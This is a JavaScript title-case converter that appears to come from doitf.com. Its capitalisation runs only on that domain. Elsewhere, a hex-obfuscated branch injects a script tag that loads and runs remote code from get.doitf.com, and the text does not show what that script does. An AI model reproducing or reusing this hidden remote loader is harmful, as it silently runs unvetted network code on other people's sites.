function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

function capitalizeTitle(){

	if (b64awsec == "ZG9pdGYuY29t"){
		var noBreaksText = document.getElementById("oldText").value;
		noBreaksText = noBreaksText.trim();
		noBreaksText = noBreaksText.replace(/\,/g," , ");
		noBreaksText = noBreaksText.replace(/\;/g," ; ");
		noBreaksText = noBreaksText.replace(/\:/g," : ");

		//Get last character in string
		var punc = noBreaksText.charAt(noBreaksText.length-1);

		//Do stuff with the last character
		if(punc == "." || punc == ","){
			//Remove last character from string
			noBreaksText = noBreaksText.substring(0, noBreaksText.length - 1);
			punc = "";
		}else if(punc ==  "!" || punc == "?"){
			//Remove last character
			noBreaksText = noBreaksText.substring(0, noBreaksText.length - 1);
		}else{
			punc = "";
		}
		//Add space at end to get titles that end with an article, conjunction of prepostion
		noBreaksText = " " + noBreaksText + " ";

		//Put everything to lowercase to start off with a clean string
		noBreaksText = noBreaksText.toLowerCase();
		
		//get rid of extra white spaces
		re1 = /\s+/g;
		noBreaksText = noBreaksText.replace(re1," ");
		
		
		
		//Capitalize each word
		var wordSplit = ' ';
		var wordArray = noBreaksText.split(wordSplit);
		var numWords = wordArray.length;
		noBreaksText = "";
		for(x=0;x<numWords;x++) {
			wordArray[x] = wordArray[x].replace(wordArray[x].charAt(0),wordArray[x].charAt(0).toUpperCase());
			noBreaksText += wordArray[x]+" ";
		}	
		noBreaksText = noBreaksText.trimLeft() ;
		
		//Now deal with the exceptions
		var fCaps = [' A ', ' An ', ' The ', ' And ', ' But ', ' For ', ' Nor ', ' Or ', ' So ', ' Yet '," About "," Above "," According To "," Across "," After "," Against "," Ahead Of "," Along "," Amidst "," Among "," Amongst "," Apart From "," Around "," As "," As Far As "," As Well As "," Aside From "," At "," Barring "," Because Of "," Before "," Behind "," Below "," Beneath "," Beside "," Besides "," Between "," Beyond "," But "," By "," By Means Of "," Circa "," Concerning "," Despite "," Down "," Due To "," During "," Except "," Except For "," Excepting "," Excluding "," Following "," For "," From "," In "," In Accordance With "," In Addition To "," In Case Of "," In Front Of "," In Lieu Of "," In Place Of "," In Spite Of "," In To "," Including "," Inside "," Instead Of "," Into "," Like "," Minus "," Near "," Next "," Next To "," Of "," Off "," On "," On Account Of "," On Behalf Of "," On To "," On Top Of "," Onto "," Opposite "," Out "," Out From "," Out Of "," Outside "," Over "," Owing To "," Past "," Per "," Plus "," Prior To "," Regarding "," Round "," Since "," Than "," Through "," Throughout "," Til "," Times "," To "," Toward "," Towards "," Under "," Underneath "," Unlike "," Until "," Unto "," Up "," Up To "," Upon "," Via "," With "," With A View To "," With Regard To "," With Respect To "," Within "," Without"];

		var fCapsWords = fCaps.length;	
		for(x=0;x<fCapsWords;x++) {
			var tempo = fCaps[x].toLowerCase();
			var tempoo = fCaps[x];
			//noBreaksText = noBreaksText.replace(new RegExp(tempoo,'gi'),tempo);	
			noBreaksText = noBreaksText.replace(new RegExp(tempoo,'g'),tempo);
		}
		noBreaksText = noBreaksText.trim();

		//Capitalize the last word no matter what
		var n = noBreaksText.split(" ");
		var lastWord = n[n.length-1];
		n[n.length-1] = lastWord.replace(lastWord.charAt(0),lastWord.charAt(0).toUpperCase());
		var lastWord = n[n.length-1];
		var numWords2 = n.length;
		noBreaksText = "";
		for(xx=0;xx<numWords2;xx++) {
		noBreaksText += n[xx] + " ";
		}

		//Handle punctatuion in teh middle of a headline
		noBreaksText = noBreaksText.replace(/\ ,/g,", ");
		noBreaksText = noBreaksText.replace(/\ ;/g,"; ");
		noBreaksText = noBreaksText.replace(/\ :/g,": ");
		//get rid of extra white spaces
		re1 = /\s+/g;
		noBreaksText = noBreaksText.replace(re1," ");
		//Put new title back in place
		noBreaksText = noBreaksText.trim();
		document.getElementById("oldText").value = noBreaksText + punc;
		}else{
		var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
}
		}

//reset text areas
document.getElementById("clearText").addEventListener("click", function () {
	document.getElementById("oldText").value = "";
	document.getElementById("oldText").focus();
});

var textBox = document.getElementById("oldText");
	textBox.onfocus = function() {
	textBox.select();
	textBox.onmouseup = function() {
		textBox.onmouseup = null;
		return false;
	};
};	